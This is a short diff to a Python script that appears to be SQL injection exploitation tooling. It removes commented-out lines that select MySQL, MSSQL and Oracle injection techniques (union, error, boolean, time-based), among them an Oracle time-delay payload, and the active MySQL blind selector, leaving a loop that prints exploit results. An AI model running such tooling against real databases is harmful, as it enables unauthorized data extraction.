@@ -280,26 +280,6 @@ def oracle_boolean():
 
   return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5)
 
-# def oracle_time():
-# SELECT DBMS_AW.INTERP('SLEEP 5') FROM DUAL
-
-# }}}
-
-#sqli = MySQL_Inband(mysql_union())
-#sqli = MySQL_Inband(mysql_error())
-#sqli = MySQL_Blind(mysql_boolean())
-#sqli = MySQL_Blind(mysql_boolean_regexp())
-sqli = MySQL_Blind(mysql_boolean_binary())
-#sqli = MySQL_Blind(mysql_time())
-
-#sqli = MSSQL_Inband(mssql_union())
-#sqli = MSSQL_Inband(mssql_error())
-#sqli = MSSQL_Inband(mssql_boolean())
-#sqli = MSSQL_Inband(mssql_time())
-
-#sqli = Oracle_Inband(oracle_union())
-#sqli = Oracle_Inband(oracle_error())
-#sqli = Oracle_Blind(oracle_boolean())
 
 for r in sqli.exploit():
   print r
